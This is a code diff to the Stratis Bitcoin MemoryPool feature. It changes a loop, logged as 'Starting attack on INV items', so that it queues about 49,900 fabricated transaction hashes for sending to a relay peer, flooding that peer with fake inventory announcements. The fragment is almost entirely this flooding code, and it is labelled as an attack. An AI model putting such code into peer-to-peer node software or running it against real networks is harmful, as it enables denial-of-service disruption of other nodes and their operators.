@@ -508,11 +508,13 @@ namespace Stratis.Bitcoin.Features.MemoryPool
                 if (peer.PeerVersion.Relay)
                 {
                     this.logger.LogInformation("Starting attack on INV items, preparing to send 49.000 hashes");
-                    int count = 0;
-                    
-                    while (count <= 49900)
+                    uint attackingHash = 0;
+
+                    while (attackingHash <= 49900)
                     {
-                        mempoolBehavior.AddTransactionToSend(hash);
+                        attackingHash += 1;
+                        mempoolBehavior.AddTransactionToSend((uint256)attackingHash);
+                        
                     }
 
                     this.logger.LogDebug("Added transaction ID '{0}' to send inventory of peer '{1}'.", hash, peer.RemoteSocketEndpoint);
